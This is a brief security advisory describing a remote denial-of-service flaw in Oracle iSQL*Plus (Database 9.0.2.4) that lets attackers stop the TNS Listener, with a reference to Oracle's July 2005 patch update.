Oracle iSQL*PLUS is susceptible to a vulnerability that allows remote attackers to stop the TNS Listener service, denying further database service to legitimate users.

By issuing a specific HTTP request, remote attackers may cause the affected application to stop the TNS Listener.

This issue was reported in Oracle Database version 9.0.2.4; other versions may also be affected.

These issues was originally described and addressed in Oracle Critical Patch Update - July 2005, BID 14238 (Oracle July Security Update Multiple Vulnerabilities). Due to the availability of more information, these issues are being assigned a separate BID.
